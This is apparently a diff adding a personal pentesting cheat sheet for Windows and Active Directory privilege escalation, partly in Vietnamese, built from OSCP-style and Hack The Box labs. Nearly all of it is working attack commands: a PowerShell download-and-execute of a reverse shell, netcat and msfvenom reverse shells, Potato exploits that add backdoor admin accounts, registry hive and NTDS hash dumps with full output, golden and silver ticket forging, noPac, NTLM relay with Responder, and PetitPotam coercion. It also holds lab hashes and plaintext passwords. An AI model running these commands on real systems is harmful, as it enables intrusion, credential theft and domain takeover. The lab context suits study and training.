@@ -1,0 +1,524 @@
+Upload shell :
+
+```jsx
+python3 -m http.server 80
+powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://your_ip/Invoke-PowerShellTcp.ps1')"
+```
+
+# WinPeass :
+
+Put winpeas in a folder and then create a smb share in the attacker machine : 
+
+```jsx
+root@kali# smbserver.py -username df -password df share . -smb2support
+```
+
+Mount the share and then go to that directory: 
+
+```jsx
+net use \\10.10.14.30\share /u:df df
+cd \\10.10.14.30\share\
+```
+
+Run winpeas : 
+
+```jsx
+.\winPEAS.exe
+```
+
+# Privileges :
+
+| **Privilege** | **What it gives you** | **Exploit method** |
+| --- | --- | --- |
+| **`SeImpersonatePrivilege`** | Impersonate a token (any authenticated user/SYSTEM token) | Potato family — JuicyPotato, PrintSpoofer, RoguePotato, GodPotato, SharpEfsPotato → direct SYSTEM shell |
+| **`SeAssignPrimaryTokenPrivilege`** | Assign a primary token to a new process | Same Potato-family exploits (often paired with SeImpersonate) |
+| **`SeBackupPrivilege`** | Read any file, bypassing ACLs | Copy SAM/SYSTEM hives, `ntds.dit`, or any sensitive file → dump hashes offline with `secretsdump` |
+| **`SeRestorePrivilege`** | Write any file, bypassing ACLs | Overwrite service binaries/DLLs, replace `utilman.exe`/`sethc.exe` for a sticky-keys backdoor → SYSTEM |
+| **`SeTakeOwnershipPrivilege`** | Take ownership of any object | `takeown /f <file>` on a protected file/service binary, then modify the ACL and replace it → SYSTEM |
+| **`SeDebugPrivilege`** | Debug/open a handle to any process | Inject into or dump a SYSTEM process (e.g. `lsass.exe` via mimikatz, or process hollowing) |
+| **`SeLoadDriverPrivilege`** | Load/unload kernel drivers | Load a vulnerable signed driver (e.g. `Capcom.sys`) for kernel-level code execution → SYSTEM |
+| **`SeTcbPrivilege`** | Act as part of the OS | Impersonate SYSTEM directly via token manipulation |
+| **`SeCreateTokenPrivilege`** | Create arbitrary tokens | Craft a token with SYSTEM/admin privileges and assign it to a process |
+| **`SeManageVolumePrivilege`** | Manage volume/disk permissions | Bypass file ACLs at the volume level to read/write protected files |
+| **`SeRelabelPrivilege`** | Change object integrity labels | Lower the integrity label on a protected object to bypass restrictions |
+| **`SeCreateGlobalPrivilege`** | Create objects in the global namespace | Used in some named-pipe / shared-section privesc chains |
+| **`SeTrustedCredManAccessPrivilege`** | Access Credential Manager stored creds | Dump saved credentials via `vaultcmd`/mimikatz |
+| **`SeSyncAgentPrivilege`** | Read all AD object data (DC only) | Used in some DCSync-adjacent attack chains |
+| **`SeEnableDelegationPrivilege`** | Enable delegation for computer/user accounts (DC) | Abuse unconstrained/constrained delegation setup for privesc |
+
+## SeImpersonatePrivilege
+
+GodPotato : 
+
+```jsx
+.\GodPotato-NET4.exe -cmd "cmd /c net user hax Password123! /add && net localgroup administrators hax /add"
+.\GodPotato-NET4.exe -cmd "cmd /c start /b C:\temp\nc.exe 10.10.170.147 4445 -e cmd"
+.\GodPotato-NET4.exe -cmd "whoami" 
+.\gp.exe -cmd 'cmd.exe /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f' (Fix remote UAC token filtering)
+./gp.exe -cmd "C:\Users\leon\Documents\nc.exe 192.168.45.219 4444 -e cmd"
+./gp.exe -cmd "cmd /c start /b C:\Users\Public\Downloads\nc.exe 10.10.164.147 4446 -e cmd"
+.\GodPotato-NET4.exe -cmd "cmd /c reg save HKLM\SAM C:\temp\sam.save && reg save HKLM\SYSTEM C:\temp\system.save && reg save HKLM\SECURITY C:\temp\security.save"
+```
+
+Printspoofer : 
+
+```jsx
+.\PrintSpoofer64.exe -c "C:\Windows\Temp\nc.exe <LHOST> 4444 -e cmd
+.\PrintSpoofer64.exe -i -c cmd
+```
+
+## SeBackupPrivilege
+
+```jsx
+https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/SeBackupPrivilege.md
+```
+
+Create a temp directory:
+
+```jsx
+mkdir C:\temp
+```
+
+Copy the sam and system hive of HKLM to C:\temp and then download them.
+
+```jsx
+reg save hklm\sam C:\temp\sam.hive
+reg save hklm\system C:\temp\system.hive
+```
+
+```jsx
+impacket-secretsdump -sam sam.hive -system system.hive LOCAL
+```
+
+```jsx
+Blackfield HTB
+```
+
+## SeRestorePrivilege
+
+```jsx
+https://www.hackingarticles.in/windows-privilege-escalation-serestoreprivilege/
+```
+
+## SeTakeOwnershipPrivilege
+
+```jsx
+https://www.hackingarticles.in/windows-privilege-escalation-setakeownershipprivilege/
+https://github.com/dollarboysushil/oscp-cpts-notes/blob/main/windows-privilege-escalation/user-privileges/setakeownershipprivilege.md
+```
+
+```jsx
+
+# AlwaysInstallElevated (check BOTH keys = 1):
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=4444 -f msi -o evil.msi
+msiexec /quiet /qn /i C:\Temp\evil.msi
+
+# Autologon creds in registry:
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
+
+# PowerShell history (GOLD MINE):
+type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+
+# Stored credentials:
+cmdkey /list
+runas /savecred /user:Administrator "C:\Temp\nc.exe <LHOST> 4444 -e cmd"  # needs ncat/ncat build
+
+# Unquoted service paths:
+wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\"
+```
+
+# Groups :
+
+# Others :
+
+## Php shell upload
+
+LD_Preload to seek functions to upload shell (Updown HTB), whenever you can upload phpinfo take that url to give to the scricpt :
+
+```jsx
+<?php phpinfo(); ?>
+```
+
+```jsx
+https://github.com/teambi0s/dfunc-bypasser
+```
+
+```jsx
+┌──(kali㉿kali)-[~/updownhtb/second]
+└─$ python2 ex.py --url "http://dev.siteisup.htb/?page=phar://uploads/330d1f22c22a0efaddba311f739b1bf3/vinh.vinh/vinh"
+/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
+
+                                                                                                                                                                                                                                            
+                                ,---,                                                                                                                                                                                                       
+                                  .'  .' `\                                                                                                                                                                                                 
+                                  ,---.'     \                                                                                                                                                                                              
+                                  |   |  .`\  |                                                                                                                                                                                             
+                                  :   : |  '  |                                                                                                                                                                                             
+                                  |   ' '  ;  :                                                                                                                                                                                             
+                                  '   | ;  .  |                                                                                                                                                                                             
+                                  |   | :  |  '                                                                                                                                                                                             
+                                  '   : | /  ;                                                                                                                                                                                              
+                                  |   | '` ,/                                                                                                                                                                                               
+                                  ;   :  .'                                                                                                                                                                                                 
+                                  |   ,.'                                                                                                                                                                                                   
+                                  '---'                                                                                                                                                                                                     
+                                                                                                                                                                                                                                            
+                                                                                                                                                                                                                                            
+                        authors: __c3rb3ru5__, $_SpyD3r_$                                                                                                                                                                                   
+                                                                                                                                                                                                                                            
+
+Please add the following functions in your disable_functions option: 
+proc_open
+If PHP-FPM is there stream_socket_sendto,stream_socket_client,fsockopen can also be used to be exploit by poisoning the request to the unix socket
+```
+
+⇒ proc_open
+
+If you have time try to learn this : 
+
+```jsx
+https://0xdf.gitlab.io/2019/08/02/bypassing-php-disable_functions-with-chankro.html
+```
+
+How to stop and start a program file : 
+
+```jsx
+If we know the exe is : C:\Program Files\Pipes Printing Service\PipesPrinting.exe
+Get-CimInstance Win32_Service | Where-Object { $_.PathName -like "*PipesPrinting.exe*" } | Select-Object Name, DisplayName, State, PathName
+Or
+sc query type= service state= all | findstr /i "SERVICE_NAME DISPLAY_NAME"
+=> sc.exe stop name
+=> sc.exe start name
+```
+
+Windows reverse shell creation:
+
+```jsx
+msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.45.219 lport=4444 -f exe -o shell.exe 
+```
+
+Reverse shell ps1 : 
+
+```jsx
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.219 LPORT=4444 -f psh -o shell.ps1
+```
+
+# Golden Ticket (Poseidon)
+
+From a compromised machine check : 
+
+```jsx
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> nltest /domain_trusts /v
+List of domain trusts:
+    0: POSEIDON poseidon.yzx (NT 5) (Forest Tree Root) (Direct Outbound) (Direct Inbound) ( Attr: withinforest )
+       Dom Guid: b77f9b23-9f53-4afc-a027-b38929b466f0
+       Dom Sid: S-1-5-21-1190331060-1711709193-932631991
+    1: sub sub.poseidon.yzx (NT 5) (Forest: 0) (Primary Domain) (Native)
+       Dom Guid: 5cdf1d22-5e08-4243-b8b1-32651fe49630
+       Dom Sid: S-1-5-21-4168247447-1722543658-2110108262
+The command completed successfully
+```
+
+If there are another root machine we can try to forge a golden ticket : 
+
+It can only work from a ntds.dit dump.
+
+```jsx
+└─$ python3 secretsdump.py -ntds /home/kali/offsec/lab/8-poseidon/2/ntds.dit -system /home/kali/offsec/lab/8-poseidon/2/system LOCAL     
+Impacket v0.14.0.dev0+20261019.123352.4f0348e8 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Target system bootKey: 0x6147911c9221199f60a625e5011aafde
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Searching for pekList, be patient
+[*] PEK # 0 found and decrypted: 510cae62a7d31edc77934766cf32f0ac
+[*] Reading and decrypting hashes from /home/kali/offsec/lab/8-poseidon/2/ntds.dit 
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:3bcdd818f7ec942ac91aa30d8db71927:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DC02$:1000:aad3b435b51404eeaad3b435b51404ee:83c19bdd3616926e56efc5a4253eb756:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:80f23a248d39b8cb93df3a4a2f4199a1:::
+POSEIDON$:1103:aad3b435b51404eeaad3b435b51404ee:01196f308a81e26264eb41dbb4b3e668:::
+sub.poseidon.yzx\chen:1104:aad3b435b51404eeaad3b435b51404ee:c4ddb64252adfc9e0558353099ded495:::
+sub.poseidon.yzx\jackie:1105:aad3b435b51404eeaad3b435b51404ee:cea6f34ba33ec67388a7bfba44d8f648:::
+sub.poseidon.yzx\lisa:1106:aad3b435b51404eeaad3b435b51404ee:905ae9b4d957545fb7b9ea0c4333247b:::
+GYOZA$:1107:aad3b435b51404eeaad3b435b51404ee:968077241d77e8117770ce3ed0a40bca:::
+sub.poseidon.yzx\eric.wallows:7101:aad3b435b51404eeaad3b435b51404ee:a1f18f9362b5485cca07aedda6792454:::
+Admin:7601:aad3b435b51404eeaad3b435b51404ee:9a6f86f3ba039b68056c2d1d72686f25:::
+[*] Kerberos keys from /home/kali/offsec/lab/8-poseidon/2/ntds.dit 
+Administrator:aes256-cts-hmac-sha1-96:e2786e98a3205f9085ef7071d992422f735ce704f4ba5c29f65f25beed348228
+Administrator:aes128-cts-hmac-sha1-96:b6593732b7ab7cecd59afadef15b4315
+Administrator:des-cbc-md5:e0e03d58a15d315e
+DC02$:aes256-cts-hmac-sha1-96:ba3ba65b315b653ea32d224afe0073f3598ef6373db207e8fa0b91268664eba7
+DC02$:aes128-cts-hmac-sha1-96:7727dda588e494c7b4ce520e00b2b0e0
+DC02$:des-cbc-md5:1f6143cbb01331ce
+krbtgt:aes256-cts-hmac-sha1-96:b2304e451b53dc5e71c08ddd0fd06a3803d8f14243020fd46c80ad44ec75d2a2
+krbtgt:aes128-cts-hmac-sha1-96:b5d83edef61d3c3799047e208e13b2c7
+krbtgt:des-cbc-md5:b95ee5a11c10d989
+POSEIDON$:aes256-cts-hmac-sha1-96:2618b7c5368e0265beeb5ac94fc9aa5019b16756550165d31378f03d84b006f8
+POSEIDON$:aes128-cts-hmac-sha1-96:69c985205083323653af6afce39caee3
+POSEIDON$:des-cbc-md5:7545074cce61d9b9
+sub.poseidon.yzx\chen:aes256-cts-hmac-sha1-96:f82ec7ba1f7bde73f1549522dde64ca50dd7ff961efcec17939e567a249da43f
+sub.poseidon.yzx\chen:aes128-cts-hmac-sha1-96:cfe54b16b15b6b2ab05e29c668e3bd6a
+sub.poseidon.yzx\chen:des-cbc-md5:e668b01cf4625ed6
+sub.poseidon.yzx\jackie:aes256-cts-hmac-sha1-96:354f64fbc9d6c06dd0df7ebfc2f390c3c4b21f91eeef0e2e4d9f7208622d34a4
+sub.poseidon.yzx\jackie:aes128-cts-hmac-sha1-96:5c1b868f3526bc69744ca24c4998ca6c
+sub.poseidon.yzx\jackie:des-cbc-md5:7a0d760de0d3d01a
+sub.poseidon.yzx\lisa:aes256-cts-hmac-sha1-96:c9f63c9c18b1cf994a0296106a91d61168e76f28a030e0e553dbdd27dd9834ef
+sub.poseidon.yzx\lisa:aes128-cts-hmac-sha1-96:65e93d705fc16a2f47edd6925fc68739
+sub.poseidon.yzx\lisa:des-cbc-md5:a2138cb9b319e673
+GYOZA$:aes256-cts-hmac-sha1-96:b6f5bfd96bc68b0b08139719c94878887b4fd2c2fa5a04f7fa7000e538f90a1b
+GYOZA$:aes128-cts-hmac-sha1-96:9ad9aaabf4bf52c63c1f408b93f90b9e
+GYOZA$:des-cbc-md5:0bdf6ef4d0d0985d
+sub.poseidon.yzx\eric.wallows:aes256-cts-hmac-sha1-96:8bef0f8a4c1efdd44a6641df5e0e1b94288c93b93f29f95cc7020d2c760e9d15
+sub.poseidon.yzx\eric.wallows:aes128-cts-hmac-sha1-96:64e9f94de2a3cd60cdfd9a0e7b2d6675
+sub.poseidon.yzx\eric.wallows:des-cbc-md5:45ecc1200d7f6762
+Admin:aes256-cts-hmac-sha1-96:a49a67c8d42340ee677664f888da3929810cadc3eba933fd0dc30e3b6b17a6b1
+Admin:aes128-cts-hmac-sha1-96:0f8745c8046d13983cb99fb171f4b87e
+Admin:des-cbc-md5:5b9e835be3155873
+[*] Cleaning up... 
+
+```
+
+Run this to reset in kali : 
+
+```jsx
+unset KRB5CCNAME
+rm -f *.ccache
+```
+
+Then forge it : 
+
+```jsx
+python3 ticketer.py -aesKey b2304e451b53dc5e71c08ddd0fd06a3803d8f14243020fd46c80ad44ec75d2a2 -domain sub.poseidon.yzx -domain-sid S-1-5-21-4168247447-1722543658-2110108262 -extra-sid S-1-5-21-1190331060-1711709193-932631991-519 -duration 2 Administrator
+```
+
+- **`aesKey`** — krbtgt’s AES256 key, straight from this dump
+- **`domain sub.poseidon.yzx`** — the child domain (confirmed by `nltest` as `Primary Domain`)
+- **`domain-sid`** — sub.poseidon.yzx’s domain SID, confirmed by `nltest` entry 1 (`Dom Sid: S-1-5-21-4168247447-1722543658-2110108262`)
+- **`extra-sid ...-519`** — poseidon.yzx’s domain SID (confirmed by `nltest` entry 0) + RID `519` (Enterprise Admins), injecting forest-root admin rights into the forged ticket
+- **`Administrator`** — the identity you’re impersonating
+
+Next : 
+
+```jsx
+export KRB5CCNAME=Administrator.ccache
+```
+
+```jsx
+┌──(.venv)─(kali㉿kali)-[~/tools/impacket/examples]
+└─$ klist
+Ticket cache: FILE:Administrator.ccache
+Default principal: Administrator@SUB.POSEIDON.YZX
+
+Valid starting       Expires              Service principal
+11/20/2026 08:43:20  11/17/2036 08:43:20  krbtgt/SUB.POSEIDON.YZX@SUB.POSEIDON.YZX
+        renew until 11/17/2036 08:43:20
+```
+
+Chạy công cụ `psexec.py` nhắm mục tiêu vào tên máy chủ viết hoa của miền cha (`DC01.poseidon.yzx`), giữ nguyên danh tính miền tạo vé (`sub.poseidon.yzx/Administrator`) cùng cờ `-k` và `-no-pass`:
+
+```jsx
+python3 psexec.py sub.poseidon.yzx/Administrator@DC01.poseidon.yzx -k -no-pass
+```
+
+# Sam account name spoofing
+
+Check if the machine is vulnerable : 
+
+```jsx
+nxc smb <dc_ip> -u <user> -p <pass> -M nopac
+
+or  
+
+python3 windapsearch.py --dc-ip <dc_ip> -u <user> -p <pass> --custom '(objectClass=domain)' -a ms-DS-MachineAccountQuota
+```
+
+Exploit : 
+
+```jsx
+# noPac.py (Impacket-based)
+python3 noPac.py <domain>/<user>:<pass> -dc-ip <dc_ip> -dc-host <dc_hostname> --impersonate administrator -shell
+
+# hoặc dùng sam-the-admin (biến thể khác)
+python3 sam_the_admin.py <domain>/<user>:<pass> -dc-ip <dc_ip> -dc-host <dc_hostname> --impersonate administrator
+```
+
+# NTLM Relay Attack
+
+```jsx
+https://zeroday-security-services.medium.com/active-directory-exploitation-ntlm-relay-as-rep-roasting-a9e4f92cad36
+```
+
+Điều kiện cần là SMB SIgning tắt : 
+
+```jsx
+nxc smb <target_range> --gen-relay-list relay_targets.txt
+# hoặc
+nmap --script smb2-security-mode -p445 <target_range>
+nmap --script=smb2-security-mode.nse -p445 192.168.132.128/24
+Nếu output show Message signing enabled but not required → dễ bị relay.
+```
+
+**LDAP signing/channel binding tắt** (để relay sang LDAP):
+
+```jsx
+nxc ldap <dc_ip> -u <user> -p <pass> -M ldap-signing
+```
+
+Lệnh để test quét một máy (thường là DC) xem nó có dễ bị “ép” (coerce) tự động authenticate ngược về máy bạn hay không.
+
+```jsx
+# 1. Tắt SMB server + HTTP server tạm thời trên Kali (tránh conflict port)
+sudo systemctl stop smbd
+
+# 2. Relay NTLM auth sang target, dump SAM hoặc thực thi lệnh
+python3 ntlmrelayx.py -tf targets.txt -smb2support
+
+# targets.txt chứa IP các máy đích, vd:
+echo "192.168.145.161" > targets.txt
+```
+
+Ket hop voi Responder de lay auth request (poisoning):
+
+```jsx
+sudo responder -I tun0
+responder -I eth0 --disable-ess
+# Responder sẽ poison LLMNR/NBT-NS, khi victim bị trick vào UNC path giả 
+# -> gửi NTLM auth về bạn -> ntlmrelayx relay tiếp sang target
+```
+
+**Ép máy khác tự connect tới bạn (coerce authentication) — rất phổ biến trong AD lab:**
+
+```bash
+# PetitPotam - ép DC authenticate về máy bạn qua MS-EFSRPC
+python3 PetitPotam.py <your_ip> <dc_ip>
+
+# hoặc PrinterBug / Coercer (gộp nhiều kỹ thuật coerce)
+python3 Coercer.py coerce -u <user> -p <pass> -d <domain> -l <your_ip> -t <dc_ip>
+```
+
+# AdminSDHolder exploit :
+
+```jsx
+https://www.hackingarticles.in/domain-persistence-adminsdholder/
+```
+
+The BloodHound graph (exported from the ignite.local domain) reveals a critical misconfiguration: sanjeet has GenericAll over the AdminSDHolder object, as well as over multiple high-value targets including:
+
+- **Adminsdholder@Ignite.Local**
+- **Administrators@Ignite.Local,**
+- **Backup Operators@Ignite.Local**
+- **Domain Admins@Ignite.Local**
+
+With GenericAll on the Domain Admins group, **sanjeet** can add themselves to it directly:
+
+```jsx
+net group "domain admins" sanjeet /add /domain
+```
+
+Second way is use bloodyad like in the link.
+
+# Silver Ticket (HTB signed)
+
+```jsx
+https://0xdf.gitlab.io/2026/02/07/htb-signed.html#auth-as-mssqlsvc
+```
+
+I’ll start by proving I can forge a ticket for a user I know, mssqlsvc. To create a ticket, I’ll need:
+
+- The NTLM hash of the service account password.
+- The domain SID
+
+To get the NTLM, I’ll use Python with the plaintext password:
+
+```
+oxdf@hacky$python3 -c 'import hashlib; print(hashlib.new("md4", "purPLE9795!@".encode("utf-16le")).hexdigest())'
+ef699384c3285c54128a3ee1ddb1a0cc
+```
+
+Get the domain SID : 
+
+```jsx
+# via impacket, with valid creds
+lookupsid.py signed.htb/scott:'Sm230#C5NatH'@10.129.242.173
+
+# via rpcclient
+rpcclient -U scott%'Sm230#C5NatH' 10.129.242.173 -c "lsaquery"
+
+# via mssql
+select SUSER_SID('Signed\IT')
+```
+
+Forge the silver ticket : 
+
+```jsx
+ticketer.py -nthash ef699384c3285c54128a3ee1ddb1a0cc -domain-sid S-1-5-21-4088429403-1159899800-2753317549 -domain signed.htb -spn MSSQLSvc/DC01.signed.htb:1433 Administrator
+```
+
+```jsx
+KRB5CCNAME=Administrator.ccache 
+mssqlclient.py -no-pass -k DC01.signed.htb
+```
+
+### Common services and their SPN format + matching client tool
+
+| Service | SPN format | Client tool |
+| --- | --- | --- |
+| MSSQL | `MSSQLSvc/host.domain.com:1433` | `mssqlclient.py -k` |
+| SMB/file shares | `CIFS/host.domain.com` | `psexec.py -k -no-pass`, `smbclient.py -k`, `smbexec.py -k` |
+| WinRM / PowerShell remoting | `HOST/host.domain.com` or `WSMAN/host.domain.com` (depends on config) | `evil-winrm -i host -r` (with ccache), or `wsmanclient` equivalents |
+| LDAP (domain controller) | `LDAP/dc.domain.com` | `secretsdump.py -k` (for further DCSync, if rights allow), `ldapsearch` with Kerberos |
+
+# Unquoted service path:
+
+Create rev shell : 
+
+```jsx
+msfvenom -p windows/shell_reverse_tcp LHOST=<your_IP> LPORT=<your_port> -f exe -o shell.exe
+```
+
+```jsx
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<your_IP> LPORT=<your_port> -f exe -o shell.exe
+```
+
+Rename it  :
+
+```jsx
+mv shell.exe script.sh
+```
+
+Get service name : 
+
+```jsx
+Get-WmiObject win32_service | Select Name, DisplayName, PathName, StartMode | Where-Object {$_.PathName -notlike "*`"*" -and $_.PathName -like "* *"} 
+Get-CimInstance win32_service | Select Name, DisplayName, PathName, StartMode | Where-Object {$_.PathName -notlike '*"*' -and $_.PathName -like '* *'}
+Get-WmiObject win32_service | Select Name, DisplayName, PathName, StartMode | Where-Object {$_.PathName -notlike '*"*' -and $_.PathName -like '* *'}
+wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows"
+reg query "HKLM\SYSTEM\CurrentControlSet\Services\auditTracker"
+reg query "HKLM\SYSTEM\CurrentControlSet\Services" /s /f "auditTracker.exe" (from exe find name)
+```
+
+Restart the service: 
+
+```jsx
+sc.exe stop <servicename>
+sc.exe start <servicename>
+or
+Restart-Service -Name <servicename> -Force
+```
+
+If that doesnt work we can restart the whole machine : 
+
+```jsx
+shutdown /r /t 0
+```
+
+# **AlwaysInstallElevated**
+
+```jsx
+https://steflan-security.com/windows-privilege-escalation-alwaysinstallelevated-policy/
+```
+
+!image.png
